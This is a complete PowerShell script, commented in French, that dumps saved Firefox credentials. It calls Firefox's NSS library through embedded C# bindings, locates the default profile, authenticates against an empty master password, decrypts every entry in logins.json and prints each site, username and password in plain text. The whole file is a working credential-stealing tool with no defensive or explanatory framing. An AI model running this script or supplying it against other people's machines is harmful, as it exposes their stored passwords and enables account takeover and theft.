#####################################################
# SCRIPT DE DECHIFFREMENT DES MOTS DE PASSE FIREFOX #
#####################################################

# --- Déclaration des types C# ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct SECItem
{
    public int type;
    public IntPtr data;
    public int len;
}

public class Kernel32
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetDllDirectory(string lpPathName);
}

public class NSSDecrypt
{
    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr PK11_GetInternalKeySlot();

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr PK11_GetBestSlot(IntPtr wincx);

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11_Authenticate(IntPtr slot, bool loadCerts, IntPtr wincx);

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11SDR_Decrypt(ref SECItem data, ref SECItem result, IntPtr cx);
}

public class Decryptor
{
    [DllImport("nss3.dll", CharSet = CharSet.Ansi)]
    public static extern int NSS_Init(string configdir);

    [DllImport("nss3.dll", CharSet = CharSet.Ansi)]
    public static extern void NSS_Shutdown();
}
"@

$debug = 0

# --- Configuration du chemin vers Firefox (répertoire des DLLs) ---
$firefoxPath = "C:\Program Files\Mozilla Firefox"
[Kernel32]::SetDllDirectory($firefoxPath) | Out-Null
if($debug) { Write-Host "DLL Directory set to: $firefoxPath" }

# --- Détection du profil Firefox ---
$profilePath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" | Where-Object { $_.Name -match "\.default" } | Select-Object -First 1
if (-not $profilePath) {
    if($debug) { Write-Host "Profil Firefox introuvable." }
    exit
}
$fullProfilePath = $profilePath.FullName
if($debug) { Write-Host "Profil Firefox : $fullProfilePath" }

# --- Initialisation NSS ---
$initResult = [Decryptor]::NSS_Init($fullProfilePath)
if($debug) { Write-Host "Code retour NSS_Init : $initResult" }
if ($initResult -ne 0) {
	if($debug) { Write-Host "Erreur lors de l'initialisation NSS." }
    exit
}
if($debug) { Write-Host "NSS initialisé avec succès." }

# --- Récupération du slot NSS ---
$slot = [NSSDecrypt]::PK11_GetInternalKeySlot()
if($debug) { Write-Host "Slot NSS via PK11_GetInternalKeySlot: $slot" }

if ($slot -eq [IntPtr]::Zero) {
    if($debug) { Write-Host "PK11_GetInternalKeySlot a échoué, tentative avec PK11_GetBestSlot..." }
    $slot = [NSSDecrypt]::PK11_GetBestSlot([IntPtr]::Zero)
    if($debug) { Write-Host "Slot NSS via PK11_GetBestSlot: $slot" }
}

if ($slot -eq [IntPtr]::Zero) {
    if($debug) { Write-Host "Échec de récupération du slot NSS via PK11_GetBestSlot également." }
    [Decryptor]::NSS_Shutdown()
    exit
}


# --- Authentification (mot de passe maître vide) ---
$authResult = [NSSDecrypt]::PK11_Authenticate($slot, $true, [IntPtr]::Zero)
if ($authResult -ne 0) {
    if($debug) { Write-Host "Échec de l'authentification PK11." }
    [Decryptor]::NSS_Shutdown()
    exit
}
if($debug) { Write-Host "Authentification NSS réussie." }

# --- Chargement du fichier logins.json ---
$loginsFile = Join-Path $fullProfilePath "logins.json"
if (-Not (Test-Path $loginsFile)) {
    if($debug) { Write-Host "Fichier logins.json introuvable." }
    [Decryptor]::NSS_Shutdown()
    exit
}
$json = Get-Content $loginsFile -Raw | ConvertFrom-Json

Write-Host "`nIdentifiants Firefox :`n"

function Decode-And-Decrypt {
    param ($b64)

    $cipherBytes = [Convert]::FromBase64String($b64)
    $cipherPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cipherBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($cipherBytes, 0, $cipherPtr, $cipherBytes.Length)

    $input = New-Object SECItem
    $input.type = 0
    $input.data = $cipherPtr
    $input.len = $cipherBytes.Length

    $output = New-Object SECItem

    $rv = [NSSDecrypt]::PK11SDR_Decrypt([ref]$input, [ref]$output, [IntPtr]::Zero)
    if ($rv -ne 0 -or $output.len -eq 0) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cipherPtr)
        return "[ERREUR DE DÉCHIFFREMENT]"
    }

    $outBytes = New-Object byte[] $output.len
    [System.Runtime.InteropServices.Marshal]::Copy($output.data, $outBytes, 0, $output.len)

    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cipherPtr)

    return [System.Text.Encoding]::UTF8.GetString($outBytes)
}

foreach ($login in $json.logins) {
    $hostname = $login.hostname
    $user = Decode-And-Decrypt $login.encryptedUsername
    $pass = Decode-And-Decrypt $login.encryptedPassword

    Write-Host "$hostname"
    Write-Host "   $user"
    Write-Host "   $pass`n"
}

# --- Nettoyage NSS ---
[Decryptor]::NSS_Shutdown()
if($debug) { Write-Host "NSS arrêté proprement." }
